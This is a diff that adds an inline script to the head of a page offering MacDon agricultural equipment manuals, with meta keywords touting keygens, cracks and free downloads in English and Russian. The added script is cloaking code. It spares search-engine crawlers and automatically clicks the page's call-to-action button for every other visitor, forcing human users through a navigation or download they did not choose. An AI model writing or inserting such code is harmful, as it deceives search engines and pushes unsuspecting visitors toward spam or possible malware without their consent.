@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MacDon Agricultural - Operator Maintenance Trouble Shooting and Parts Manuals</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="MacDon Agricultural Manuals: Operator, Maintenance, Trouble Shooting, and Parts PDFs for download. Includes multiple model varieties for all regions">
     <meta name="keywords" content="MacDon Agricultural manuals, MacDon operator maintenance manual, MacDon trouble shooting manual, MacDon parts manuals PDF, MacDon agricultural equipment manuals, MacDon operator manual PDF free download, MacDon parts manual 2023, MacDon manuals catalog free download, MacDon operator manual download, MacDon maintenance manual download, MacDon troubleshooting manual download free, MacDon agricultural manual keygen, MacDon parts manual crack, MacDon parts manual free download, MacDon operator manual PDF free, MacDon manuals collection 2023, MacDon agricultural PDF free download, MacDon parts catalog download, Скачать руководства MacDon, MacDon руководство оператора скачать, MacDon руководство по обслуживанию скачать, Руководства MacDon по запчастям скачать бесплатно, MacDon каталоги бесплатная загрузка">
     <style>
